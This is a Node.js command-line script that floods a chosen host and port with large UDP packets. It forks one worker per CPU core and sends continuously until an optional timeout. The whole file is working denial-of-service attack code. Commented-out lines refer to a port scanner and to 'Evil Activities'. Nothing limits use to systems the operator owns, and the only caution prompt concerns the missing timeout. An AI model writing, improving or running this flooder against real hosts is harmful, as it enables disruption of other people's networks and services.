const cluster = require('cluster');
var evilscan = require('evilscan');
let program = require('commander');
const Confirm = require('prompt-confirm');
const http = require('http');
const numCPUs = require('os').cpus().length;
var options = {
    target: '127.0.0.1',
    port: '21-23',
    status: 'TROU',
    banner: true
};

let programHelp = program
    .version('0.1.0')
    .option('-h, --host <host>', 'Host Name/IP')
    .option('-p, --port [port]', 'If not defined, program will use random ports.', parseInt)
    .option('-t, --timeout [timeout]', 'Timeout in millisecond. If not defined, it will be unlimited.', parseInt);

programHelp.parse(process.argv);

function udpFlood(host, port, timeout, pid) {

    let HOST = host;
    let dgram = require('dgram');
    let client = dgram.createSocket('udp4');

    let output = "";
    for (let i = 65500; i >= 0; i--) {
        output += "X";
    }
    let startTime = new Date();
    // You can also pass array of ports to check
    // portScanner.findAPortNotInUse([3000, 3001, 3002, 3003, 3004, 3005, 3006, 3007, 3008, 3009], '127.0.0.1', function(error, port) {
    //     console.log('PORT IN USE AT: ' + port)
    // })
    const N = 65535;
    const numberArray = Array.apply(null, {length: N}).map(Number.call, Number);
    // portScanner.findAPortInUse([3001, 3002, 3003, 3004, 3005, 3006, 3007, 3008, 3009]).then(function (port, error) {// ports 0 to 1023 are reserved
    // console.log('PORT IN USE AT: ' + port);
    // if (error) {return error}
    while (1) {
        // const randomPort = Math.floor(Math.random() * (65535) + 1);
        // const PORT = port || randomPort;
        if (timeout) {
            let nowTime = new Date();
            if (nowTime.getTime() >= (startTime.getTime() + timeout)) {
                break;
            }
        }

        let message = Buffer.from(output);

        // console.log('PORT IN USE AT: ' + port);
        client.send(message, 0, message.length, port, HOST, function (err, bytes) {
            if (err) throw err;
            console.log('UDP message sent to ' + HOST + ':' + port + ' pid: ' + pid);
        });
    }
    // })
}

function start(host: any, port: any, timeout: any) {
    if (cluster.isMaster) {
        console.log(`Master ${process.pid} is running`);

        // Fork workers.
        for (let i = 0; i < numCPUs; i++) {
            cluster.fork();
        }

        cluster.on('exit', (worker, code, signal) => {
            console.log(`EXITING: worker ${worker.process.pid} died`);
        });
    } else {

        // Workers can share any TCP connection
        // In this case it is an HTTP server
        // http.createServer((req, res) => {
        //     res.writeHead(200);
        //     res.end('hello world\n');
        // }).listen(8000);

        // var scanner = new evilscan(options);
        // scanner.on('result', function (data) {
        //     // fired when item is matching options
        //     console.log(data);
        // });
        // scanner.on('error', function (err, data) {
        //     throw new Error(data.toString());
        // });
        // scanner.on('done', function () {
        //     // finished !
        //     console.log('Evil Activities finished')
        // });
        // scanner.run();

        console.log(`Worker ${process.pid} started`);
        udpFlood(host, port, timeout, process.pid);
    }
}

if (program.host) {

    if (!program.timeout) {
        new Confirm('CAUTION: You are running flood without any timeout to stop, you can define a timeout with --timeout. Continue? [Y/N] ')
            .ask(function (answer) {
                console.log(answer);
                if (!answer) {
                    console.log('Ok, run program again with --timeout parameter.');
                    process.stdin.destroy();
                } else {
                    // udpFlood(program.host, program.port, null);
                    start(program.host, program.port, null)
                }
            });
    } else {
        // udpFlood(program.host, program.port, program.timeout);
        start(program.host, program.port, program.timeout);
    }

} else {
    programHelp.help();
}